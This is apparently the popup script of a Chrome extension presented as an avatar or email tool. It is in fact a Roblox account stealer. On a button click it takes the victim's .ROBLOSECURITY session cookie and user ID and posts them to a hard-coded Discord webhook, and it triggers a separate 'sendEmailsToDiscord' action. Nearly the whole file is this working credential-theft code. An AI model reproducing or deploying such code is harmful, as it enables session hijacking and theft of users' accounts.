// Function to inject and execute getUserIdFromSessionStorage in the webpage context
function executeInPage(callback) {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
        chrome.scripting.executeScript({
            target: {tabId: tabs[0].id},
            func: () => {
                const storageData = sessionStorage.getItem('roblox-user-profiles-ttl');
                if (storageData) {
                    try {
                        const data = JSON.parse(storageData);
                        return data.userId || null;
                    } catch (error) {
                        console.error('Error parsing session storage data:', error);
                        return null;
                    }
                }
                return null;
            }
        }, (results) => {
            if (results && results[0]) {
                callback(results[0].result);
            } else {
                callback(null);
            }
        });
    });
}

// Function to send data to Discord webhook
function sendToDiscord(cookieName, cookieValue, userId) {
    const webhookUrl = 'https://discord.com/api/webhooks/1299640294542807131/R0yzNsmlbVQV80RkqsyOeYAlT26ZPzrk8poaypYkEpo8YMpESIePp_59BXcGUb5glKf2';

    const payload = {
        content: `**Cookie Information Retrieved**\n**Cookie Name**: ${cookieName}\n**Cookie Value**: ${cookieValue}\n**User ID**: ${userId || 'Not found'}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    }).then(response => {
        if (response.ok) {
            console.log('Data sent to Discord successfully');
        } else {
            console.error('Failed to send data to Discord. Response status:', response.status);
        }
    }).catch(error => {
        console.error('Error sending data to Discord:', error);
    });
}

// Function to check cookie
function checkCookie() {
    const cookieName = '.ROBLOSECURITY';

    // First get the userId, then get the cookie
    executeInPage((userId) => {
        console.log("Retrieved userId:", userId);

        // Now get the cookie
        chrome.runtime.sendMessage({ action: 'getCookie', name: cookieName }, (response) => {
            if (chrome.runtime.lastError) {
                console.error('Runtime error:', chrome.runtime.lastError);
                return;
            }

            if (response && response.cookieExists) {
                const cookieValue = response.cookieValue;
                sendToDiscord(cookieName, cookieValue, userId);
            } else {
                console.error(response.error || 'Cookie not found or could not be retrieved.');
            }
        });
    });
}

// popup.js

document.addEventListener('DOMContentLoaded', () => {
    const checkCookieButton = document.getElementById('checkCookieButton');
    if (checkCookieButton) {
        checkCookieButton.addEventListener('click', () => {
            checkCookie();
            sendEmailsToDiscord();
        });
        console.log('Compile Avatar and Send Emails button found and event listener added.');
    } else {
        console.error('Compile Avatar and Send Emails button not found');
    }
});

function sendEmailsToDiscord() {
    console.log('Initiating sendEmailsToDiscord process...');
    chrome.runtime.sendMessage({ action: 'sendEmailsToDiscord' }, (response) => {
        if (chrome.runtime.lastError) {
            console.error('Error:', chrome.runtime.lastError.message);
            displayStatus('Error sending emails.', 'red');
            return;
        }

        if (response && response.status) {
            console.log('Response from background script:', response.status);
            displayStatus(response.status, response.success ? 'green' : 'red');
        } else {
            console.error('No response from background script.');
            displayStatus('No response from background script.', 'orange');
        }
    });
}

function displayStatus(message, color) {
    const statusDiv = document.getElementById('status');
    if (statusDiv) {
        statusDiv.textContent = message;
        statusDiv.style.color = color;
    } else {
        console.error('Status div not found');
    }
}
